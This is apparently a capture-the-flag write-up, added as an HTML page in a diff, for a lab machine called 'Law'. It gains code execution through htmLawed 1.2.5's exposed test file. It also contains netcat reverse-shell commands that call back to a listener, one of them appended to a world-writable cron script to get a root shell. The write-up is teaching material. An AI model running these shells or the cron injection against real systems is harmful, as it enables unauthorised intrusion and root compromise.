@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Law &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Law</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">htmLawed</span><span class="tag">RCE</span><span class="tag">BurpSuite</span><span class="tag">CronJob</span><span class="tag">WritableScript</span><span class="tag">PrivEsc</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#htmlawed-1-2-5-rce-via-test-file">htmLawed 1.2.5, RCE via Test File</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#world-writable-cron-script">World-Writable Cron Script</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Law runs htmLawed 1.2.5, an HTML sanitisation library with its test file exposed at the web root. The test file has a known RCE vulnerability, but the request has to be sent to <code>/</code> rather than the expected path to get a response. From there, a world-writable cleanup script runs as a cron job under root, and appending a reverse shell to it closes the box.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-title: htmLawed (1.2.5) test
+</code></pre>
+<p>The HTTP title immediately revealed the application: <strong>htmLawed 1.2.5</strong>. No directory enumeration was needed, the version was in the response headers.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="htmlawed-1-2-5-rce-via-test-file">htmLawed 1.2.5, RCE via Test File</h3>
+<p>htmLawed 1.2.5 exposes <code>htmLawedTest.php</code>, a developer test interface that passes input through the library and displays the processed result. This file has a known RCE vulnerability because it uses <code>assert()</code> on attacker-controlled input.</p>
+<blockquote>
+<p><strong>Why <code>assert()</code> equals RCE:</strong> PHP's <code>assert()</code> function can evaluate a string as PHP code when passed a string argument. If user input reaches <code>assert()</code> without sanitisation, it functions identically to <code>eval()</code>. The htmLawed test file passes <code>$_POST['text']</code> through a code path that ends up in <code>assert()</code>.</p>
+</blockquote>
+<p>The default request path sends <code>POST /htmLawedTest.php</code>, which returns a 404 on this host. The file is served from the web root, so the request needs to go to <code>/</code> instead. Intercepting the request in Burp and changing:</p>
+<pre><code class="language-http">POST /htmLawedTest.php HTTP/1.1
+</code></pre>
+<p>to:</p>
+<pre><code class="language-http">POST / HTTP/1.1
+</code></pre>
+<p>Confirmed RCE, a test input of <code>id</code> returned:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Sent the same modified request with an nc reverse shell as the command:</p>
+<pre><code class="language-sh">nc 192.168.45.244 80 -e /bin/sh
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.190] 51578
+whoami
+www-data
+</code></pre>
+<p>Shell upgraded:</p>
+<pre><code class="language-sh">script /dev/null -c /bin/bash
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="world-writable-cron-script">World-Writable Cron Script</h3>
+<p>Manual inspection found a world-readable and world-writable script:</p>
+<pre><code>/var/www/cleanup.sh
+</code></pre>
+<p>Contents:</p>
+<pre><code class="language-bash">#!/bin/bash
+
+rm -rf /var/log/apache2/error.log
+rm -rf /var/log/apache2/access.log
+</code></pre>
+<blockquote>
+<p><strong>Why writable cron scripts are a direct path to root:</strong> the script's content doesn't matter, what matters is who runs it and whether it can be modified. If a privileged account (including root) executes this script on a schedule, appending a command to it executes that command at the same privilege level. No SUID needed, no exploits.</p>
+</blockquote>
+<p>Appended a reverse shell:</p>
+<pre><code class="language-sh">echo 'nc 192.168.45.244 443 -e /bin/bash' &gt;&gt; cleanup.sh
+</code></pre>
+<p>When the cron fired:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 443
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.190] 35412
+whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Version in the HTTP title is the fastest route to an exploit.</strong> The title <code>htmLawed (1.2.5) test</code> skipped all web enumeration and pointed directly at the CVE.</li>
+<li><strong>Burp path modification is the fix for "endpoint exists but returns 404."</strong> The application responded at <code>/</code> but not at the named file path; a single request edit resolved it.</li>
+<li><strong>World-writable scripts run by root are trivial to exploit.</strong> Check file permissions on anything in <code>/var/www/</code>, <code>/opt/</code>, or <code>/usr/local/</code> as one of the first post-shell steps.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
